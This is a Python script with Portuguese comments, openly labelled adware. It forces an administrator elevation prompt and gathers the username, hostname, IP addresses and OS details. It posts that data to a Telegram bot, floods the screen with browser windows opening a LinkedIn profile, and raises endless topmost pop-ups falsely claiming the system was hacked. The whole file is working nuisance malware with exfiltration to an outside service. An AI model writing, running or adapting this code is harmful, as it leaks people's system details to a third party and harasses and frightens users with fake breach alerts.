import os
import sys
import socket
import requests
import ctypes
import tkinter as tk
from tkinter import messagebox
from random import randint
import webbrowser
import psutil
import threading
import time

# Configuração do Telegram
TOKEN_TELEGRAM = "<SEU_TOKEN_TELEGRAM>"
ID_CHAT_TELEGRAM = "<SEU_ID_TELEGRAM>"

# URL do LinkedIn para redirecionamento
URL_PERFIL_LINKEDIN = "<SUA_URL_LINKEDIN>"

# Controle para execução do Adware
executando_adware = True

def coletar_detalhes_sistema(admin_status):
    """
    Coleta e retorna detalhes do sistema, como IPs, sistema operacional e usuário atual.
    """
    try:
        hostname = socket.gethostname()
        usuario = os.getlogin()
        sistema_operacional = f"{os.name} ({sys.platform})"
        ips = [addr.address for iface, addrs in psutil.net_if_addrs().items() for addr in addrs if addr.family == socket.AF_INET]
        detalhes = (
            f"🔎 <b>Detalhes do Sistema:</b>\n"
            f"👤 <b>Usuário:</b> {usuario}\n"
            f"💻 <b>Host:</b> {hostname}\n"
            f"🌐 <b>IPs:</b> {' | '.join(ips)}\n"
            f"🖥️ <b>Sistema:</b> {sistema_operacional}\n"
            f"🔐 <b>Privilégios Administrativos:</b> {'Concedidos ✅' if admin_status else 'Negados ❌'}\n"
        )
        return detalhes
    except Exception as e:
        return f"Erro ao coletar detalhes do sistema: {e}"

def enviar_notificacao_telegram(nome_arquivo, admin_status):
    """
    Envia um alerta ao Telegram com os detalhes da execução do script.
    """
    pasta_atual = os.path.dirname(os.path.abspath(nome_arquivo))
    detalhes_sistema = coletar_detalhes_sistema(admin_status)
    mensagem = (
        f"🟡 <b>ALERTA MÉDIO: Adware '{nome_arquivo}' foi ativado!</b>\n"
        f"📂 <b>Localização:</b> {pasta_atual}\n"
        f"{detalhes_sistema}\n"
    )
    try:
        url = f"https://api.telegram.org/bot{TOKEN_TELEGRAM}/sendMessage"
        payload = {"chat_id": ID_CHAT_TELEGRAM, "text": mensagem, "parse_mode": "HTML"}
        requests.post(url, data=payload, timeout=10)
        print(f"Alerta enviado ao Telegram: {mensagem}")
    except requests.exceptions.RequestException as e:
        print(f"Erro ao enviar alerta ao Telegram: {e}. Continuando execução...")

def garantir_privilegios_administrativos():
    """
    Escala privilégios administrativos, se necessário.
    """
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            sys.exit()
    except Exception as e:
        print(f"Erro ao escalar privilégios: {e}")
        sys.exit(1)

def abrir_janelas_navegador():
    """
    Abre automaticamente 5 janelas separadas no navegador a cada 5 segundos.
    """
    while executando_adware:
        for _ in range(5):
            threading.Thread(target=webbrowser.open_new, args=(URL_PERFIL_LINKEDIN,)).start()
        time.sleep(5)

def exibir_popups_adware():
    """
    Exibe pop-ups rápidos e persistentes na tela.
    """
    global executando_adware

    def mostrar_popup():
        """
        Função para exibir um único pop-up, garantindo que esteja sempre por cima.
        """
        root = tk.Tk()
        root.title("🚨 ALERTA - Sistema Hackeado 🚨")

        # Tamanho e posição aleatória
        largura = randint(300, 500)
        altura = randint(150, 200)
        pos_x = randint(0, root.winfo_screenwidth() - largura)
        pos_y = randint(0, root.winfo_screenheight() - altura)
        root.geometry(f"{largura}x{altura}+{pos_x}+{pos_y}")

        # Conteúdo do pop-up
        mensagem = "🚨 ALERTA!\nSeu sistema foi Hackeado!\nAção necessária!"
        label = tk.Label(
            root,
            text=mensagem,
            fg="red",
            font=("Arial", 12),
            justify="center"
        )
        label.pack(expand=True)

        # Garante que o pop-up esteja sempre por cima
        root.attributes("-topmost", True)

        # Encerrar o loop ao fechar o pop-up
        def interromper_adware():
            global executando_adware
            executando_adware = False
            root.destroy()

        root.protocol("WM_DELETE_WINDOW", interromper_adware)

        # Fecha automaticamente após 0,5 segundos
        root.after(500, root.destroy)
        root.mainloop()

    while executando_adware:
        threading.Thread(target=mostrar_popup).start()
        time.sleep(0.5)

def perguntar_se_leu_txt(nome_txt):
    """
    Exibe um pop-up perguntando se o usuário leu o arquivo explicativo.
    """
    root = tk.Tk()
    root.withdraw()  # Oculta a janela principal
    while True:
        resposta = messagebox.askquestion(
            "Confirmação Necessária",
            f"Você leu o arquivo explicativo '{nome_txt}'?\n\n"
            "Por favor, leia antes de continuar."
        )
        if resposta.lower() in ["yes", "sim"]:
            messagebox.showinfo("Confirmado", "Obrigado por confirmar.")
            return True
        else:
            messagebox.showwarning("Leitura Obrigatória", "Por favor, leia o arquivo antes de continuar.")

if __name__ == "__main__":
    garantir_privilegios_administrativos()
    nome_arquivo = os.path.basename(sys.argv[0])
    nome_txt = f"{os.path.splitext(nome_arquivo)[0]}.txt"

    # Pop-up de confirmação sobre a leitura do arquivo explicativo
    if not perguntar_se_leu_txt(nome_txt):
        sys.exit()

    enviar_notificacao_telegram(nome_arquivo, True)

    # Inicia os comportamentos simultâneos
    threading.Thread(target=abrir_janelas_navegador).start()
    threading.Thread(target=exibir_popups_adware).start()

    print("Ataque Hacker Concluído.")
